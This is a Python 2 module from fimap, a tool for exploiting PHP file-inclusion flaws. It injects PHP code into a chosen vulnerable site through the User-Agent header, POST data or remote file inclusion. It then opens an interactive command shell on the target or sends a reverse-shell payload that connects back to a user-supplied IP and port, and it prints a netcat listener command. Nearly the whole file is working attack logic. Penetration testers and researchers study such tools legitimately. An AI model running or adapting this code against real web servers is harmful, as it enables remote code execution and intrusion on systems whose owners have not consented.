#
# This file is part of fimap.
#
# Copyright(c) 2009 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

import sys
from baseClass import baseClass
from config import settings
import urllib2

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$03.09.2009 03:40:49$"

shell_banner =  "-------------------------------------------\n" + \
                "Welcome to fimap shell!\n" + \
                "Better don't start interactive commands! ;)\n" +\
                "Enter 'q' to exit the shell.\n"+\
                "-------------------------------------------"


class codeinjector(baseClass):
    def _load(self):
        self.report = None

    def setReport(self, report):
        self.report = report

    def testExecutionMethods(self):
        info_payload = self.globSet.settings["php_info"][0]
        info_pattern = self.globSet.settings["php_info"][1]
        
        #for k,v in self.globSet.settings["php_exec"]

    def start(self):
        domain = self.chooseDomains()
        vuln   = self.chooseVuln(domain.getAttribute("hostname"))

        hostname = domain.getAttribute("hostname")
        mode = vuln.getAttribute("mode")
        path = vuln.getAttribute("path")
        param = vuln.getAttribute("param")
        prefix = vuln.getAttribute("prefix")
        suffix = vuln.getAttribute("suffix")
        appendix = vuln.getAttribute("appendix")
        shcode = vuln.getAttribute("file")
        paramvalue = vuln.getAttribute("paramvalue")
        payload = "%s%s%s" %(prefix, shcode, suffix)
        path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))

        url  = "http://%s%s" %(hostname, path)

        if (mode.find("A") != -1 and mode.find("x") != -1):
            self._log("Testing code injection thru User-Agent...", self.globSet.LOG_INFO)
            self.globSet.setUserAgent(settings["php_info"][0])
            code = self.doGetRequest(url)
            if (code.find(settings["php_info"][1]) != -1):
                self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
                #self.filterResult(code, hostname)
                for item in settings["php_exec"]:
                    name, payload = item
                    self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
                    testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
                    self.globSet.setUserAgent(testload)
                    code = self.doGetRequest(url)
                    if code.find(settings["shell_test"][1]) != -1:
                        attack = self.chooseAttackMode()
                        rndStart = self.getRandomStr()
                        rndEnd = self.getRandomStr()
                        if attack==1:
                            cmd = ""
                            print shell_banner
                            while cmd != "q" and cmd != "quit":
                                cmd = raw_input("fimap_shell$> ")
                                if (cmd.strip() != ""):
                                    userload = payload.replace("__PAYLOAD__", cmd)
                                    userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
                                    self.globSet.setUserAgent(userload)
                                    code = self.doGetRequest(url)
                                    code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                                    print code.strip()

                            print "See ya dude!"
                            sys.exit(0)
                        elif attack==2:
                            ip   = raw_input("Enter your the IP where the shell should connect to: ")
                            port = int(raw_input("Enter your the Port where the shell should connect to: "))
                            print "netcat cmdline: nc -l -vv -p %d" %port
                            raw_input("Open netcat on the target machine now and press enter...")
                            print "Creating reverse shell now..."
                            shellcode = settings["reverse_shell_code"]
                            shellcode = shellcode.replace("__IP__", ip)
                            shellcode = shellcode.replace("__PORT__", str(port))
                            shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
                            self.globSetUserAgent(shellcode)
                            code = self.doGetRequest(url)
                            code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                            print code.strip()
                            sys.exit(0)

        if (mode.find("P") != -1 and mode.find("x") != -1):
            self._log("Testing code injection thru POST...", self.globSet.LOG_INFO)
            code = self.doPostRequest(url, settings["php_info"][0])
            if (code.find(settings["php_info"][1]) != -1):
                self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
                #self.filterResult(code, hostname)
                for item in settings["php_exec"]:
                    name, payload = item
                    self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
                    testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
                    code = self.doPostRequest(url, testload)
                    if (code != None):
                        if code.find(settings["shell_test"][1]) != -1:
                            attack = self.chooseAttackMode()
                            rndStart = self.getRandomStr()
                            rndEnd = self.getRandomStr()
                            if attack==1:
                                cmd = ""
                                print shell_banner
                                while cmd != "q" and cmd != "quit":
                                    cmd = raw_input("fimap_shell$> ")
                                    if (cmd.strip() != ""):
                                        userload = payload.replace("__PAYLOAD__", cmd)
                                        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
                                        code = self.doPostRequest(url, userload)
                                        code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                                        print code.strip()
                                print "See ya dude!"
                                sys.exit(0)
                            elif attack==2:
                                ip   = raw_input("Enter your the IP where the shell should connect to: ")
                                port = int(raw_input("Enter your the Port where the shell should connect to: "))
                                print "netcat cmdline: nc -l -vv -p %d" %port
                                raw_input("Open netcat on the target machine now and press enter...")
                                print "Creating reverse shell now..."
                                shellcode = settings["reverse_shell_code"]
                                shellcode = shellcode.replace("__IP__", ip)
                                shellcode = shellcode.replace("__PORT__", str(port))
                                shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
                                code = self.doPostRequest(url, shellcode)
                                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                                print code.strip()
                                sys.exit(0)

        if (mode.find("R") != -1 and mode.find("x") != -1):
            if settings["dynamic_rfi"]["mode"] in ("ftp", "local"):
                self._log("Testing code thru RFI...", self.globSet.LOG_INFO)
                if self.executeRFI(url, appendix, settings["php_info"][0]).find(settings["php_info"][1]) != -1:
                    for item in settings["php_exec"]:
                        name, payload = item
                        self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
                        testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
                        code = self.executeRFI(url, appendix, testload)
                        if code.find(settings["shell_test"][1]) != -1:
                            attack = self.chooseAttackMode()
                            rndStart = self.getRandomStr()
                            rndEnd = self.getRandomStr()
                            if attack==1:
                                cmd = ""
                                print shell_banner
                                while cmd != "q" and cmd != "quit":
                                    cmd = raw_input("fimap_shell$> ")
                                    if (cmd.strip() != ""):
                                        userload = payload.replace("__PAYLOAD__", cmd)
                                        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
                                        code = self.executeRFI(url, appendix, userload)
                                        code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                                        print code.strip()
                                print "See ya dude!"
                                sys.exit(0)
                            elif attack==2:
                                ip   = raw_input("Enter your the IP where the shell should connect to: ")
                                port = int(raw_input("Enter your the Port where the shell should connect to: "))
                                print "netcat cmdline: nc -l -vv -p %d" %port
                                raw_input("Open netcat on the target machine now and press enter...")
                                print "Creating reverse shell now..."
                                shellcode = settings["reverse_shell_code"]
                                shellcode = shellcode.replace("__IP__", ip)
                                shellcode = shellcode.replace("__PORT__", str(port))
                                shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
                                code = self.executeRFI(url, appendix, shellcode)
                                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                                print code.strip()
                                sys.exit(0)

            else:
                print "fimap is currently not configured to exploit RFI exploits."
                sys.exit(1)


        else:
            print "Currently not supported."

    def chooseAttackMode(self):
        header = "Available Attacks"
        textarr = []
        textarr.append("[1] Spawn shell")
        textarr.append("[2] Create reverse shell...")
        self.drawBox(header, textarr)
        try:
            tech = raw_input("Choose Attack: ")
            tech = int(tech)
        except:
            print "Invalid attack mode."
            sys.exit(1)

        return(tech)
        
    def executeRFI(self, URL, appendix, content):
        if settings["dynamic_rfi"]["mode"]=="ftp":
            up = self.FTPuploadFile(content, appendix)
            code = self.doGetRequest(URL)
            self.FTPdeleteFile(up["ftp"])
            return(code)
        elif settings["dynamic_rfi"]["mode"]=="local":
            fname = settings["dynamic_rfi"]["local"]["local_path"] + appendix
            f = open(fname, "w")
            f.write(content)
            f.close()
            code = self.doGetRequest(URL)
            return(code)

    
    def chooseDomains(self):
        choose = {}
        nodes = self.getDomainNodes()
        idx = 1
        header = "List of Domains"
        textarr = []
        for n in nodes:
            host = n.getAttribute("hostname")
            choose[idx] = n
            textarr.append("[%d] %s" %(idx, host))
            idx = idx +1
        self.drawBox(header, textarr)
        c = raw_input("Choose Domain: ")
        try:
            c = int(c)
            return(choose[c])
        except:
            print "Invalid Domain ID."
            sys.exit(1)


    def chooseVuln(self, hostname):
        choose = {}
        nodes = self.getNodesOfDomain(hostname)
            
        idx = 1
        header = "FI Bugs on " + hostname
        textarr = []
        for n in nodes:
            path = n.getAttribute("path")
            file = n.getAttribute("file")
            param = n.getAttribute("param")
            mode = n.getAttribute("mode")
            if (mode.find("x") != -1):
                choose[idx] = n
                textarr.append("[%d] URL: '%s' injecting file: '%s' using param: '%s'" %(idx, path, file, param))
                idx = idx +1
        if (idx == 1):
            print "This domain has no usable bugs."
            sys.exit(1)

        self.drawBox(header, textarr)
        c = raw_input("Choose vulnerable script: ")
        try:
            c = int(c)
            return(choose[c])
        except:
            print "Invalid script ID."
            sys.exit(1)